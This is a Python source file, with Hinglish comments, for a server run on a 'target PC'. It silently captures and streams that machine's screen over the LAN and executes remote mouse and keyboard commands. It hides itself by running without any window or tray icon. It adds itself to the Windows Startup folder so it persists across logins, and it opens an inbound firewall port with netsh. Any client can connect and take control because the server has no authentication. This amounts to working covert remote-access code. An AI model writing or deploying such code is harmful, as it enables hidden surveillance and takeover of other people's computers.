"""
server.py - Target PC par chalao
Screen capture karke LAN pe stream karta hai
Silent mode - koi window nahi, koi tray icon nahi
"""

import socket
import struct
import time
import subprocess
import mss
import numpy as np
import cv2
import sys
import os
import threading
import json
import ctypes

# ============ SETTINGS ============
PORT = 9999          # Port number (client mein bhi same hona chahiye)
FPS = 15             # Frames per second
QUALITY = 85        # JPEG quality (1-100) - zyada = better quality, zyada bandwidth
MONITOR = 1          # 1 = primary screen, 2 = secondary screen
# ==================================

if os.name == 'nt':
    user32 = ctypes.windll.user32
    KEYEVENTF_EXTENDEDKEY = 0x0001
    KEYEVENTF_KEYUP = 0x0002
    MOUSEEVENTF_MOVE = 0x0001
    MOUSEEVENTF_LEFTDOWN = 0x0002
    MOUSEEVENTF_LEFTUP = 0x0004
    MOUSEEVENTF_RIGHTDOWN = 0x0008
    MOUSEEVENTF_RIGHTUP = 0x0010
    MOUSEEVENTF_MIDDLEDOWN = 0x0020
    MOUSEEVENTF_MIDDLEUP = 0x0040
    MOUSEEVENTF_WHEEL = 0x0800
    VK_CODE_MAP = {
        'backspace': 0x08,
        'tab': 0x09,
        'enter': 0x0D,
        'shift': 0x10,
        'ctrl': 0x11,
        'alt': 0x12,
        'pause': 0x13,
        'capslock': 0x14,
        'esc': 0x1B,
        'space': 0x20,
        'pageup': 0x21,
        'pagedown': 0x22,
        'end': 0x23,
        'home': 0x24,
        'left': 0x25,
        'up': 0x26,
        'right': 0x27,
        'down': 0x28,
        'insert': 0x2D,
        'delete': 0x2E,
    }


def press_vk(vk_code):
    if os.name != 'nt':
        return
    user32.keybd_event(vk_code, 0, 0, 0)
    user32.keybd_event(vk_code, 0, KEYEVENTF_KEYUP, 0)


def press_text_key(text):
    if os.name != 'nt' or not text:
        return
    if len(text) == 1:
        vk_result = user32.VkKeyScanW(ord(text))
        if vk_result == -1:
            return
        vk_code = vk_result & 0xff
        shift_state = (vk_result >> 8) & 0xff
        if shift_state & 1:
            user32.keybd_event(0x10, 0, 0, 0)
        if shift_state & 2:
            user32.keybd_event(0x11, 0, 0, 0)
        if shift_state & 4:
            user32.keybd_event(0x12, 0, 0, 0)
        press_vk(vk_code)
        if shift_state & 4:
            user32.keybd_event(0x12, 0, KEYEVENTF_KEYUP, 0)
        if shift_state & 2:
            user32.keybd_event(0x11, 0, KEYEVENTF_KEYUP, 0)
        if shift_state & 1:
            user32.keybd_event(0x10, 0, KEYEVENTF_KEYUP, 0)
        return
    vk_code = VK_CODE_MAP.get(text.lower())
    if vk_code is not None:
        press_vk(vk_code)


def handle_mouse_action(payload):
    if os.name != 'nt':
        return
    x = int(payload.get('x', 0))
    y = int(payload.get('y', 0))
    button = payload.get('button')
    action = payload.get('action')
    if action == 'move':
        user32.SetCursorPos(x, y)
        return
    user32.SetCursorPos(x, y)
    if button == 'left':
        flag = MOUSEEVENTF_LEFTDOWN if action == 'down' else MOUSEEVENTF_LEFTUP
    elif button == 'right':
        flag = MOUSEEVENTF_RIGHTDOWN if action == 'down' else MOUSEEVENTF_RIGHTUP
    elif button == 'middle':
        flag = MOUSEEVENTF_MIDDLEDOWN if action == 'down' else MOUSEEVENTF_MIDDLEUP
    else:
        return
    user32.mouse_event(flag, 0, 0, 0, 0)


def handle_keyboard_action(payload):
    key = payload.get('key')
    if isinstance(key, int):
        if 32 <= key <= 126:
            press_text_key(chr(key))
            return
        special = {
            13: 'enter',
            8: 'backspace',
            9: 'tab',
            27: 'esc',
            32: 'space',
            2490368: 'up',
            2621440: 'down',
            2424832: 'left',
            2555904: 'right',
        }.get(key)
        if special:
            press_text_key(special)
        return
    if isinstance(key, str):
        press_text_key(key)


def control_loop(conn):
    buffer = b''
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            buffer += data
            while b'\n' in buffer:
                raw_line, buffer = buffer.split(b'\n', 1)
                raw_line = raw_line.strip()
                if not raw_line:
                    continue
                try:
                    payload = json.loads(raw_line.decode('utf-8'))
                except Exception:
                    continue
                message_type = payload.get('type')
                if message_type == 'mouse_move':
                    handle_mouse_action({'action': 'move', 'x': payload.get('x', 0), 'y': payload.get('y', 0)})
                elif message_type == 'mouse_button':
                    handle_mouse_action(payload)
                elif message_type == 'key_press':
                    handle_keyboard_action(payload)
    except Exception:
        pass

def get_app_path():
    if getattr(sys, 'frozen', False):
        return sys.executable
    return os.path.abspath(__file__)


def ensure_startup_entry():
    """Add a per-user Windows Startup entry so the server launches after login."""
    if os.name != 'nt':
        return

    try:
        appdata = os.environ.get('APPDATA')
        if not appdata:
            return

        startup_dir = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        os.makedirs(startup_dir, exist_ok=True)

        target_path = get_app_path()
        startup_bat = os.path.join(startup_dir, 'ScreenMirrorServer.bat')

        if getattr(sys, 'frozen', False):
            launch_line = f'"{target_path}"'
        else:
            launch_line = f'"{sys.executable}" "{target_path}"'

        content = (
            '@echo off\r\n'
            'rem Auto-generated by ScreenMirror server\r\n'
            f'start "" /min {launch_line}\r\n'
        )

        current = None
        if os.path.exists(startup_bat):
            try:
                with open(startup_bat, 'r', encoding='utf-8') as f:
                    current = f.read()
            except Exception:
                current = None

        if current != content:
            with open(startup_bat, 'w', encoding='utf-8', newline='\r\n') as f:
                f.write(content)
            log(f'Startup entry ready: {startup_bat}')
    except Exception as e:
        log(f'Startup setup skipped: {e}')


def ensure_firewall_rule():
    """Windows firewall mein port allow rule add karo (best effort)."""
    if os.name != 'nt':
        return

    try:
        check = subprocess.run(
            [
                'netsh', 'advfirewall', 'firewall', 'show', 'rule',
                'name=ScreenMirror'
            ],
            capture_output=True,
            text=True,
            timeout=5
        )

        # Rule agar already hai to dobara add karne ki zarurat nahi.
        if 'No rules match' not in (check.stdout + check.stderr):
            log('Firewall rule already exists: ScreenMirror')
            return

        add = subprocess.run(
            [
                'netsh', 'advfirewall', 'firewall', 'add', 'rule',
                'name=ScreenMirror', 'dir=in', 'action=allow',
                'protocol=TCP', f'localport={PORT}'
            ],
            capture_output=True,
            text=True,
            timeout=8
        )

        if add.returncode == 0:
            log(f'Firewall rule added: ScreenMirror TCP {PORT}')
        else:
            log(f'Firewall rule add failed (run as admin): {add.stdout} {add.stderr}')
    except Exception as e:
        log(f'Firewall setup skipped: {e}')

def capture_and_stream():
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_sock.bind(('0.0.0.0', PORT))
        server_sock.listen(1)
        server_sock.settimeout(5.0)
    except OSError as e:
        log(f"Port {PORT} bind error: {e}")
        sys.exit(1)

    log(f"Listening on port {PORT}...")

    with mss.MSS() as sct:
        monitor = sct.monitors[MONITOR]
        
        while True:
            try:
                conn, addr = server_sock.accept()
                log(f"Client connected: {addr[0]}")
                conn.settimeout(10.0)
                stream_to_client(conn, sct, monitor)
            except socket.timeout:
                continue
            except Exception as e:
                log(f"Connection error: {e}")
                time.sleep(1)

def stream_to_client(conn, sct, monitor):
    frame_time = 1.0 / FPS
    control_thread = threading.Thread(target=control_loop, args=(conn,), daemon=True)
    control_thread.start()
    
    try:
        while True:
            t_start = time.time()
            
            # Screen capture
            img = np.array(sct.grab(monitor))
            img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
            
            # JPEG encode
            _, buf = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, QUALITY])
            data = buf.tobytes()
            
            # Size pehle bhejo (4 bytes), phir image data
            size = struct.pack('>I', len(data))
            conn.sendall(size + data)
            
            # FPS control
            elapsed = time.time() - t_start
            sleep_time = frame_time - elapsed
            if sleep_time > 0:
                time.sleep(sleep_time)
                
    except (ConnectionResetError, BrokenPipeError, socket.timeout):
        log("Client disconnected")
    except Exception as e:
        log(f"Stream error: {e}")
    finally:
        conn.close()

def log(msg):
    # Log file mein likhta hai (background mode mein console nahi hota)
    log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'server.log')
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    try:
        with open(log_path, 'a') as f:
            f.write(f"[{timestamp}] {msg}\n")
    except:
        pass

if __name__ == '__main__':
    log("Server started")
    ensure_startup_entry()
    ensure_firewall_rule()
    capture_and_stream()